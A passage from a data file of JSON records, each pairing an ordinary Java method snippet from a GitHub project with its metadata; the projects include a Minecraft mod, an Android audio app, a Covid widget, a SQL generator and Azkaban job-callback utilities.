"method_name": "executeProcedure", "class_name": "PottedRedAmaranthOnBlockRightClickedProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"entity\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency entity for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tEntity entity = (Entity) dependencies.get(\"entity\");\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif ((((entity instanceof LivingEntity) ? ((LivingEntity) entity).getHeldItemMainhand() : ItemStack.EMPTY)\n\t\t\t\t.getItem() == new ItemStack(Blocks.AIR, (int) (1)).getItem())) {\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.AIR.getDefaultState(), 3);\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.FLOWER_POT.getDefaultState(), 3);\n\t\t\tif (entity instanceof LivingEntity) {\n\t\t\t\tItemStack _setstack = new ItemStack(RedAmaranthBlock.block, (int) (1));\n\t\t\t\t_setstack.setCount((int) 1);\n\t\t\t\t((LivingEntity) entity).setHeldItem(Hand.MAIN_HAND, _setstack);\n\t\t\t\tif (entity instanceof ServerPlayerEntity)\n\t\t\t\t\t((ServerPlayerEntity) entity).inventory.markDirty();\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/PottedRedAmaranthOnBlockRightClickedProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 59021, "method_name": "getLayoutId", "class_name": "SoundEffectAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId(int viewType) {\n        return R.layout.item_sound_effect;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 59022, "method_name": "onCreateViewHolder", "class_name": "SoundEffectAdapter", "params": ["VH", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreateViewHolder(@NotNull VH holder, int viewType) {\n\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 59023, "method_name": "onBindViewHolder", "class_name": "SoundEffectAdapter", "params": ["VH", "SoundMode", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NotNull VH holder, SoundMode data, int position) {\n        holder.setText(R.id.tvText, data.getName());\n        if (position == 0) {\n            holder.setText(R.id.tvType, \"\");\n        } else {\n            holder.setText(R.id.tvType, position <= 9 ? \"\uff08\u97f3\u6548\uff09\" : \"\uff08\u53d8\u58f0\uff09\");\n        }\n\n        ImageView selected = holder.getView(R.id.ivSelected);\n        selected.setVisibility(selecteIndex == position ? View.VISIBLE : View.GONE);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 59024, "method_name": "selecte", "class_name": "SoundEffectAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void selecte(int position) {\n        if (position == selecteIndex) {\n            return;\n        }\n\n        int old = this.selecteIndex;\n        this.selecteIndex = position;\n        notifyItemChanged(old);\n        notifyItemChanged(selecteIndex);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 59025, "method_name": "filter", "class_name": "AllSeedsInstruction", "params": ["ProgramInstance", "LongStream"], "throws": null, "modifiers": ["public"], "return_type": "LongStream", "snippet": "    public LongStream filter(ProgramInstance program, LongStream seeds) {\n        return LongStream.range(0, program.getProgram().getLcg().modulus).parallel();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/instruction/AllSeedsInstruction.java", "stars": "14", "class_props": {"extends": "Instruction", "implements": null, "modifiers": ["public"]}}, {"id": 59026, "method_name": "writeOperands", "class_name": "AllSeedsInstruction", "params": ["StringBuilder", "boolean", "Function<Constraint,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeOperands(StringBuilder output, boolean verbose, Function<Constraint<?>, String> constraintNames) {\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/instruction/AllSeedsInstruction.java", "stars": "14", "class_props": {"extends": "Instruction", "implements": null, "modifiers": ["public"]}}, {"id": 59027, "method_name": "readOperands", "class_name": "AllSeedsInstruction", "params": ["StringParser", "LCG", "Function<String,Constraint>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readOperands(StringParser parser, LCG lcg, Function<String, Constraint<?>> constraintRetriever) {\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/instruction/AllSeedsInstruction.java", "stars": "14", "class_props": {"extends": "Instruction", "implements": null, "modifiers": ["public"]}}, {"id": 59028, "method_name": "initialize", "class_name": "WidgetController", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n        try {\n            configModel = new ConfigurationService().getConfiguration();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        initializeScheduler();\n        initializeContextMenu();\n        textCountryCode.setText(configModel.getCountryCode());\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59029, "method_name": "initializeScheduler", "class_name": "WidgetController", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initializeScheduler() {\n        executorService = Executors.newSingleThreadScheduledExecutor();\n        executorService.scheduleAtFixedRate(this::loadData, 0, configModel.getRefreshIntervalInSeconds(), TimeUnit.SECONDS);\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59030, "method_name": "loadData", "class_name": "WidgetController", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadData() {\n        System.out.println(\"Refreshing data...\");\n\n        DataProviderService dataProviderService = new DataProviderService();\n        CovidDataModel covidDataModel = dataProviderService.getData(configModel.getCountryName());\n\n        Platform.runLater(() -> {\n            inflateData(covidDataModel);\n        });\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59031, "method_name": "inflateData", "class_name": "WidgetController", "params": ["CovidDataModel"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void inflateData(CovidDataModel covidDataModel) {\n        GlobalData globalData = covidDataModel.getGlobalData();\n        textGlobalReport.setText(getFormattedData(globalData.getCases(), globalData.getRecovered(), globalData.getDeaths()));\n\n        CountryData countryData = covidDataModel.getCountryData();\n        textCountryReport.setText(getFormattedData(countryData.getCases(), countryData.getRecovered(), countryData.getDeaths()));\n\n        readjustStage(textCountryCode.getScene().getWindow());\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59032, "method_name": "getFormattedData", "class_name": "WidgetController", "params": ["long", "long", "long"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getFormattedData(long totalCases, long recoveredCases, long totalDeaths) {\n        return String.format(\"Cases: %-8d | Recovered: %-6d | Deaths: %-6d\", totalCases, recoveredCases, totalDeaths);\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59033, "method_name": "readjustStage", "class_name": "WidgetController", "params": ["Window"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void readjustStage(Window stage) {\n        stage.sizeToScene();\n\n        Rectangle2D visualBounds = Screen.getPrimary().getVisualBounds();\n        stage.setX(visualBounds.getMaxX() - 25 - textCountryCode.getScene().getWidth());\n        stage.setY(visualBounds.getMinY() + 25);\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59034, "method_name": "initializeContextMenu", "class_name": "WidgetController", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initializeContextMenu() {\n        MenuItem exitItem = new MenuItem(\"Exit\");\n        exitItem.setOnAction(event -> {\n            System.exit(0);\n        });\n\n        MenuItem refreshItem = new MenuItem(\"Refresh now\");\n        refreshItem.setOnAction(event -> {\n            executorService.schedule(this::loadData, 0, TimeUnit.SECONDS);\n        });\n\n        final ContextMenu contextMenu = new ContextMenu(exitItem, refreshItem);\n        rootPane.addEventHandler(MouseEvent.MOUSE_PRESSED, event -> {\n            if (event.isSecondaryButtonDown()) {\n                contextMenu.show(rootPane, event.getScreenX(), event.getScreenY());\n            } else {\n                if (contextMenu.isShowing()) {\n                    contextMenu.hide();\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/gui/widget/WidgetController.java", "stars": "11", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59035, "method_name": "getSynopsis", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSynopsis() {\n        return synopsis;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59036, "method_name": "setSynopsis", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSynopsis(String synopsis) {\n        this.synopsis = synopsis;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59037, "method_name": "getRuntime", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRuntime() {\n        return runtime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59038, "method_name": "setRuntime", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRuntime(String runtime) {\n        this.runtime = runtime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59039, "method_name": "getStatus", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59040, "method_name": "setStatus", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59041, "method_name": "getLastUpdated", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLastUpdated() {\n        return lastUpdated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59042, "method_name": "setLastUpdated", "class_name": "AnimeDetails", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLastUpdated(long lastUpdated) {\n        this.lastUpdated = lastUpdated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59043, "method_name": "getV", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getV() {\n        return v;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59044, "method_name": "setV", "class_name": "AnimeDetails", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setV(int v) {\n        this.v = v;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59045, "method_name": "getEpisodes", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Episode>", "snippet": "    public List<Episode> getEpisodes() {\n        return episodes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59046, "method_name": "setEpisodes", "class_name": "AnimeDetails", "params": ["List<Episode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEpisodes(List<Episode> episodes) {\n        this.episodes = episodes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 59047, "method_name": "select", "class_name": "SQLGeneratorImpl", "params": ["List<TableColumnMeta>", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String select(List<TableColumnMeta> metas, String tableName) {\n        StringBuilder sb = new StringBuilder(\"SELECT \");\n        for (int i = 0; i < metas.size(); i++) {\n            TableColumnMeta meta = metas.get(i);\n            sb.append(meta.getField());\n            if (i != metas.size() - 1) {\n                sb.append(\",\");\n            } else {\n                sb.append(\" \");\n            }\n        }\n        sb.append(\"FROM \").append(tableName).append(\";\");\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/SQLGeneratorImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["SQLGenerator"], "modifiers": ["public"]}}, {"id": 59048, "method_name": "update", "class_name": "SQLGeneratorImpl", "params": ["List<TableColumnMeta>", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String update(List<TableColumnMeta> metas, String tableName) {\n        StringBuilder sb = new StringBuilder(\"UPDATE \")\n                .append(tableName)\n                .append(\" SET \");\n        String pri = \"\";\n        for (int i = 0; i < metas.size(); i++) {\n            TableColumnMeta meta = metas.get(i);\n            sb.append(meta.getField());\n            if (i != metas.size() - 1) {\n                sb.append(\"='',\");\n            } else {\n                sb.append(\" \");\n            }\n            String key = meta.getKey();\n            if (StringUtils.nonEmpty(key) & \"PRI\".equals(key)) {\n                pri = meta.getField();\n            }\n        }\n        sb.append(\"WHERE \").append(pri).append(\"=''\").append(\";\");\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/SQLGeneratorImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["SQLGenerator"], "modifiers": ["public"]}}, {"id": 59049, "method_name": "insert", "class_name": "SQLGeneratorImpl", "params": ["List<TableColumnMeta>", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String insert(List<TableColumnMeta> metas, String tableName) {\n        StringBuilder sb = new StringBuilder(\"INSERT INTO \");\n        sb.append(tableName).append(\" (\");\n        StringBuilder sb1 = new StringBuilder();\n        for (int i = 0; i < metas.size(); i++) {\n            TableColumnMeta meta = metas.get(i);\n            sb.append(meta.getField());\n            sb1.append(\"' '\");\n            if (i != metas.size() - 1) {\n                sb.append(\",\");\n                sb1.append(\",\");\n            } else {\n                sb.append(\") \");\n                sb1.append(\");\");\n            }\n        }\n        sb.append(\"VALUES (\").append(sb1);\n\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/SQLGeneratorImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["SQLGenerator"], "modifiers": ["public"]}}, {"id": 59050, "method_name": "delete", "class_name": "SQLGeneratorImpl", "params": ["List<TableColumnMeta>", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String delete(List<TableColumnMeta> metas, String tableName) {\n        return \"DROP TABLE \" + tableName + \";\";\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/SQLGeneratorImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["SQLGenerator"], "modifiers": ["public"]}}, {"id": 59051, "method_name": "isThereJobCallbackProperty", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean isThereJobCallbackProperty(final Props props,\n      final JobCallbackStatusEnum status) {\n\n    if (props == null || status == null) {\n      throw new NullPointerException(\"One of the argument is null\");\n    }\n\n    final String jobCallBackUrl = firstJobcallbackPropertyMap.get(status);\n    return props.containsKey(jobCallBackUrl);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59052, "method_name": "isThereJobCallbackProperty", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean isThereJobCallbackProperty(final Props props,\n      final JobCallbackStatusEnum... jobStatuses) {\n\n    if (props == null || jobStatuses == null) {\n      throw new NullPointerException(\"One of the argument is null\");\n    }\n\n    for (final JobCallbackStatusEnum jobStatus : jobStatuses) {\n      if (JobCallbackUtil.isThereJobCallbackProperty(props, jobStatus)) {\n        return true;\n      }\n    }\n    return false;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59053, "method_name": "parseJobCallbackProperties", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum", "Map<String,String>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<HttpRequestBase>", "snippet": "  public static List<HttpRequestBase> parseJobCallbackProperties(final Props props,\n      final JobCallbackStatusEnum status, final Map<String, String> contextInfo,\n      final int maxNumCallback) {\n\n    return parseJobCallbackProperties(props, status, contextInfo,\n        maxNumCallback, logger);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59054, "method_name": "parseJobCallbackProperties", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum", "Map<String,String>", "int", "Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<HttpRequestBase>", "snippet": "  public static List<HttpRequestBase> parseJobCallbackProperties(final Props props,\n      final JobCallbackStatusEnum status, final Map<String, String> contextInfo,\n      final int maxNumCallback, final Logger privateLogger) {\n    String callbackUrl = null;\n\n    if (!isThereJobCallbackProperty(props, status)) {\n      // short circuit\n      return Collections.emptyList();\n    }\n\n    final List<HttpRequestBase> result = new ArrayList<>();\n\n    // replace property templates with status\n    final String jobCallBackUrlKey =\n        replaceStatusToken(JOB_CALLBACK_URL_TEMPLATE, status);\n\n    final String requestMethod =\n        replaceStatusToken(JOB_CALLBACK_REQUEST_METHOD_TEMPLATE, status);\n\n    final String httpBodyKey = replaceStatusToken(JOB_CALLBACK_BODY_TEMPLATE, status);\n\n    final String headersKey =\n        replaceStatusToken(JOB_CALLBACK_REQUEST_HEADERS_TEMPLATE, status);\n\n    for (int sequence = 1; sequence <= maxNumCallback; sequence++) {\n      HttpRequestBase httpRequest = null;\n      final String sequenceStr = Integer.toString(sequence);\n      // callback url\n      final String callbackUrlKey =\n          jobCallBackUrlKey.replace(SEQUENCE_TOKEN, sequenceStr);\n\n      callbackUrl = props.get(callbackUrlKey);\n      if (callbackUrl == null || callbackUrl.length() == 0) {\n        // no more needs to done\n        break;\n      } else {\n        final String callbackUrlWithTokenReplaced =\n            replaceTokens(callbackUrl, contextInfo, true);\n\n        final String requestMethodKey =\n            requestMethod.replace(SEQUENCE_TOKEN, sequenceStr);\n\n        final String method = props.getString(requestMethodKey, HTTP_GET);\n\n        if (HTTP_POST.equals(method)) {\n          final String postBodyKey = httpBodyKey.replace(SEQUENCE_TOKEN, sequenceStr);\n          final String httpBodyValue = props.get(postBodyKey);\n          if (httpBodyValue == null) {\n            // missing body for POST, not good\n            // update the wiki about skipping callback url if body is missing\n            privateLogger.warn(\"Missing value for key: \" + postBodyKey\n                + \" skipping job callback '\" + callbackUrl + \" for job \"\n                + contextInfo.get(CONTEXT_JOB_TOKEN));\n          } else {\n            // put together an URL\n            final HttpPost httpPost = new HttpPost(callbackUrlWithTokenReplaced);\n            final String postActualBody =\n                replaceTokens(httpBodyValue, contextInfo, false);\n            privateLogger.info(\"postActualBody: \" + postActualBody);\n            httpPost.setEntity(createStringEntity(postActualBody));\n            httpRequest = httpPost;\n          }\n        } else if (HTTP_GET.equals(method)) {\n          // GET\n          httpRequest = new HttpGet(callbackUrlWithTokenReplaced);\n        } else {\n          privateLogger.warn(\"Unsupported request method: \" + method\n              + \". Only POST and GET are supported\");\n        }\n\n        final String headersKeyPerSequence =\n            headersKey.replace(SEQUENCE_TOKEN, sequenceStr);\n        final String headersValue = props.get(headersKeyPerSequence);\n        privateLogger.info(\"headers: \" + headersValue);\n        final Header[] headers = parseHttpHeaders(headersValue);\n        if (headers != null) {\n          httpRequest.setHeaders(headers);\n          privateLogger.info(\"# of headers found: \" + headers.length);\n        }\n        result.add(httpRequest);\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59055, "method_name": "parseHttpHeaders", "class_name": "JobCallbackUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Header", "snippet": "  public static Header[] parseHttpHeaders(final String headers) {\n    if (headers == null || headers.length() == 0) {\n      return null;\n    }\n\n    final String[] headerArray = headers.split(HEADER_ELEMENT_DELIMITER);\n    final List<Header> headerList = new ArrayList<>(headerArray.length);\n    for (int i = 0; i < headerArray.length; i++) {\n      final String headerPair = headerArray[i];\n      final int index = headerPair.indexOf(HEADER_NAME_VALUE_DELIMITER);\n      if (index != -1) {\n        headerList.add(new BasicHeader(headerPair.substring(0, index),\n            headerPair.substring(index + 1)));\n      }\n\n    }\n    return headerList.toArray(new BasicHeader[0]);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59056, "method_name": "replaceStatusToken", "class_name": "JobCallbackUtil", "params": ["String", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "  private static String replaceStatusToken(final String template,\n      final JobCallbackStatusEnum status) {\n    return template.replaceFirst(STATUS_TOKEN, status.name().toLowerCase());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59057, "method_name": "createStringEntity", "class_name": "JobCallbackUtil", "params": ["String"], "throws": null, "modifiers": ["static", "private"], "return_type": "StringEntity", "snippet": "  private static StringEntity createStringEntity(final String str) {\n    try {\n      return new StringEntity(str);\n    } catch (final UnsupportedEncodingException e) {\n      throw new RuntimeException(\"Encoding not supported\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59058, "method_name": "buildJobContextInfoMap", "class_name": "JobCallbackUtil", "params": ["Event", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<String,String>", "snippet": "  public static Map<String, String> buildJobContextInfoMap(final Event event,\n      final String server) {\n\n    if (event.getRunner() instanceof JobRunner) {\n      final JobRunner jobRunner = (JobRunner) event.getRunner();\n      final ExecutableNode node = jobRunner.getNode();\n      final EventData eventData = event.getData();\n      final String projectName = node.getParentFlow().getProjectName();\n      final String flowName = node.getParentFlow().getFlowId();\n      final String executionId =\n          String.valueOf(node.getParentFlow().getExecutionId());\n      final String jobId = node.getId();\n\n      final Map<String, String> result = new HashMap<>();\n      result.put(CONTEXT_SERVER_TOKEN, server);\n      result.put(CONTEXT_PROJECT_TOKEN, projectName);\n      result.put(CONTEXT_FLOW_TOKEN, flowName);\n      result.put(CONTEXT_EXECUTION_ID_TOKEN, executionId);\n      result.put(CONTEXT_JOB_TOKEN, jobId);\n      result.put(CONTEXT_JOB_STATUS_TOKEN, eventData.getStatus().name().toLowerCase());\n\n      /*\n       * if (node.getStatus() == Status.SUCCEEDED || node.getStatus() ==\n       * Status.FAILED) { result.put(JOB_STATUS_TOKEN,\n       * node.getStatus().name().toLowerCase()); } else if (node.getStatus() ==\n       * Status.PREPARING) { result.put(JOB_STATUS_TOKEN, \"started\"); }\n       */\n\n      return result;\n\n    } else {\n      throw new IllegalArgumentException(\"Provided event is not a job event\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59059, "method_name": "replaceTokens", "class_name": "JobCallbackUtil", "params": ["String", "Map<String,String>", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String replaceTokens(final String value,\n      final Map<String, String> contextInfo, final boolean withEncoding) {\n\n    String result = value;\n    String tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_SERVER_TOKEN), withEncoding);\n    